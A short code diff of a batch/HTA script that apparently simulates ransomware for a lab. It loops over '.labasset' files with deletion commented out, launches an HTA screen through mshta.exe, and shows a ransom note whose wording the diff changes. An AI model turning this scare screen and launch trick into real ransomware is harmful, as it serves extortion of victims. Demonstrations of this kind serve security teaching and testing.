@@ -19,7 +19,6 @@ FOR /R "%ROOT_PATH%" %%X in (*.labasset) DO (
     REM del "%%X"
 )
 
-REM Block Screen
 cls
 setlocal
 for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
@@ -51,7 +50,7 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 <div id="ransomNote">
     Ooops, your files have been encrypted!<br>
     <br><br>
-    Your important files are encrypted. Nobody can recover your files without our decryption service.<br>
+    Your important files are encrypted. Nobody can get back your files without our decryption service.<br>
     <br><br>
    Github.com/SegoCode<br>
     <br><br><br>
